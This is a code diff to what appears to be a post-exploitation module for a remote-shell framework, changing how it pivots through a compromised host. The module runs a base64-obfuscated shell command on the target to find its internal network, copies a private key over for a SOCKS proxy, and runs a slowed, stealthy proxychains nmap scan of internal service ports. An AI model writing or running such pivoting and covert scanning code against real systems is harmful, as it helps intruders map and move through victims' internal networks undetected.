@@ -50,7 +50,7 @@ class Module(BaseModule):
             payload = base64.b64encode(b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1')
             result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
             session.log(f'Target LAN: {result.stdout}')
-            target_lan = str(result.stdout)
+            target_lan = bytes(result.stdout).decode().strip()
 
             # transfer files from target to attacker
             session.log("copying private key to target...")
@@ -77,8 +77,11 @@ class Module(BaseModule):
 
             # run nmap scan via proxychains
             session.log('running proxychains nmap...')
-            result = subprocess.run(['proxychains', 'nmap', '-Pn', '-p-', target_lan], cwd='/tmp', capture_output=True, text=True)
+            result = subprocess.run(['proxychains', 'nmap', '-Pn', '-sT', '-T1', '-oX', 'scan.xml', '-p22,80,443,5000,8000,8080,8091', target_lan], cwd='/tmp', capture_output=True, text=True)
             session.log(f'Result: {result.stdout}')
+
+            # convert to json 
+            # cat /tmp/scan.xml | jc --xml -p > /tmp/scan.json
 
             # remove temporary archive from target
             if session.platform.Path('/tmp/sockskey').exists():
